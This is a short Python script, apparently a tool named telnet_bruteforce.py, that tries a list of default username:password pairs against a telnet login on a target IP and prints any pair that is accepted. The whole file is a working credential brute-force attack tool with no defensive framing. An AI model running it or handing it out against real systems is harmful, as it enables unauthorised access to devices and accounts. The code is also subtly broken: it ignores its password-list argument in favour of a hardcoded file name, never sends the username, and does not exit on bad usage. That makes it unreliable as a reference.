import sys
import multiprocessing
import time
from timeit import default_timer as timer
import telnetlib

HOST = "127.0.0.1"

def telnet_bruteforce(host, credentials_filepath):
    credentials_found = False
    # Start timer
    start = timer()
    counter = 0

    for line in [line.strip() for line in open('telnet_default-credentials.txt')]:
        time.sleep(0.5)

        user, password = line.split(":")

        tn = telnetlib.Telnet(host)

        tn.read_until(b"Password: ")
        tn.write(password.encode('ascii') + b"\n")

        n, match, previous = tn.expect([b"\r\nPassword:"], 1)
        counter += 1

        print("[" + str(counter) + "] Trying " + user + ":" + password)

        if not match:
            credentials_found = True
            print("\n[*] Credentials found!")
            print("[*] Username: " + user)
            print("[*] Password: " + password)
            break
        else:
            continue

    if not credentials_found:
        print("[*] No credentials successful")

    # Stop timer & calculate time elapsed
    end = timer()
    elapsed = end - start
    print("[*] Time: " + str(elapsed))
    sys.exit()


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("[*] Usage: python telnet_bruteforce.py <TARGET IPADDR> <PASSWORD_LIST FILEPATH>")
        print("[*] Version: Python > 2.7 ")
        print("[*] Filepath: File path to password list")

    host = sys.argv[1]
    credentials_filepath = sys.argv[2]

    telnet_bruteforce(host, credentials_filepath)